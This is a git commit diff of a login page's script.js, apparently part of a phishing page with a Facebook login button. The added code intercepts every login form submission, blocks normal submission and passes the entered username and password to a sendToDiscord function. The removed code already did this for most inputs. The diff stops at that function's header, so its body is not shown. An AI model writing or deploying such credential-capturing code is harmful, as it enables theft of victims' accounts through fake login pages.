83883d092e76a02a5539bf08156efc44e29f3f00
7test357 <7test357@gmail.com>
2024-11-24 20:11:26 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,27 +1,10 @@
-let inputTag = document.getElementsByTagName("input");
-let buttonArray = document.getElementsByTagName("button");
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-let inputId = inputTag[0];
-let inputPassword = inputTag[1];
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-let ordinaryButton = buttonArray[0];
-let facebookLoginButton = buttonArray[1];
-
-inputPassword.addEventListener("keyup", () => {
-    if (inputId.value && inputPassword.value) {
-        ordinaryButton.classList.remove("unactivatedLoginColor");
-        ordinaryButton.classList.add("activatedLoginColor");
-    } else {
-        ordinaryButton.classList.remove("activatedLoginColor");
-        ordinaryButton.classList.add("unactivatedLoginColor");
-    }
-});
-
-ordinaryButton.addEventListener('click', () => {
-    if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
-    } else {
-        sendToDiscord(inputId.value, inputPassword.value);
-    }
+    sendToDiscord(username, password);
 });
 
 function sendToDiscord(userId, password) {
